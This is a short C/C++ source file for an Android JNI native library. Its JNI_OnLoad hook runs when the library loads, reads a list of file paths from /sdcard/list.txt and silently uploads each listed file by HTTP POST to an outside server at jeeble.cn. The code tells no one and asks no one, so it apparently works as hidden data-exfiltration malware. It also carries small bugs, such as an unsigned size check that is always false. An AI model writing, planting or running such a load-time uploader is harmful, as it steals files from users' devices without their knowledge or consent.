

#include <jni.h>

#include <sys/stat.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include "HttpClient.h"
#include "HttpPostInputChunk.h"
#include "HttpPostFileChunk.h"

static void trim(char* str) {
	char* p = str + strlen(str) - 1;
	while(p > str) {
		if (*p == '\r') {
			*p = '\0';
		} else if (*p == '\n') {
			*p = '\0';
		} else {
			break;
		}
	}
}

unsigned long getFileSize(const char *path) {  
	unsigned long filesize = -1;
	struct stat statbuff;
	if(stat(path, &statbuff) < 0) {
		return filesize;
	} else {
		filesize = statbuff.st_size;
	}
	return filesize;
}

JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *reserved) {
	const char* path = "/sdcard/list.txt";
	unsigned long filesize = getFileSize(path);
	
	if (filesize < 0) {
		return JNI_VERSION_1_4;
	}
	
	FILE* fp = fopen(path, "r");
	if (fp == NULL) {
		return JNI_VERSION_1_4;
	}
	
	vector<HttpPostChunk*> fields;
	fields.push_back(new HttpPostInputChunk("server", "jeeble"));
	fields.push_back(new HttpPostInputChunk("leader", "xxxx"));
//	fields.push_back(new HttpPostFileChunk("data", "/data/local/tmp/test.txt"));

	char line[256];
	while(fgets(line, 256, fp)) {
		trim(line);
		fields.push_back(new HttpPostFileChunk("data", line));
	}
	
	fclose(fp);
	
	HttpClient* http = new HttpClient();
	http->post("http://jeeble.cn/upload.php", fields);
	
	return JNI_VERSION_1_4;
}
